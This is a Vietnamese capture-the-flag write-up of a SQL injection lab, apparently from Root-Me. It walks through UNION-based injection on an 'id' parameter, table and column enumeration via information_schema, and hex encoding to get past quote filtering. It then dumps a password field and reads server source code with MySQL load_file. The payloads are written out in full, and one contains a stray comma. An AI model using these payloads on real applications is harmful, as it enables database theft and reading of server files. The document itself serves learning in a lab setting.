Dễ dàng thấy được vị trí thực hiện sql injection là đường dẫn khi bấm vào link `admin` trên tab Members sau:

> ?action=members&id=1

thử với id bằng 2 ra no result, xem ra cả bảng user có 1 tài khoản admin thôi.

Thử câu injection đơn giản:

> id=1 union select 1

lỗi: 

> The used SELECT statements have a different number of columns

vậy phải select nhiều hơn 1 column, thử đến `select 1,2,3,4` mới ra kết quả:

> no result found

lạ thật, có vẻ nó không cho in ra 2 kết quả thì phải. Vậy mình ép kết quả của query chỉ có 1 hàng thôi:

> id=2 union select 1,2,3,4

lần này thì được rồi:

`ID : 1
Username : 2
Email : 4`

inject với câu query quen thuộc:

> id=2 union select table_name,2,3,4 from information_schema.tables where table_schema=database() limit 1

kết quả:

`ID : member
Username : 2
Email : 4`

tìm được tên bảng là member, vậy tiếp theo:

> id =2 union select group_concat(column_name) from information_schema.columns where table_name='member'

Nhưng nhận ra dấu `'` bị filter thành `\'`. Theo như bài `SQL routed` đã từng làm, thử hex encode member rồi nhét trở lại câu query:

> id =2 union select group_concat(column_name) from information_schema.columns where table_name=0x6D656D626572

kết quả:

```
ID : member_id,member_login,member_password,member_email
Username : 2
Email : 4
```

Vậy làm câu lệnh để lấy password ra thôi:

> id=2 union select ,member_password,2,3,4 from member
>
> VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==

tuy nhiên nộp thử thì đây lại không phải password. Để ý từ đầu tới giờ ta chưa dùng gì đến hàm đọc file. `MySQL` có 1 hàm tên là `load_file`. Thử đọc code:

> id=2 union select 1,2,3,load_file('index.php')

quên mất là bị filter dấu nháy đơn. Thử hex encode đoạn trong dấu ngoặc(hex thì không lấy dấu nháy đơn):

> id=2 union select 1,2,3,load_file(0x27696E6465782E70687027)

vẫn không được, khó hiểu ghê...

Lên mạng kiếm sol, hóa ra phải điền full đường dẫn challenge/web-serveur/ch31/index.php. Lại:

> id=2 union select 1,2,3,load_file(0x6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870)

ra được code của file index.php rồi. Từ đây tự decode ra password thôi



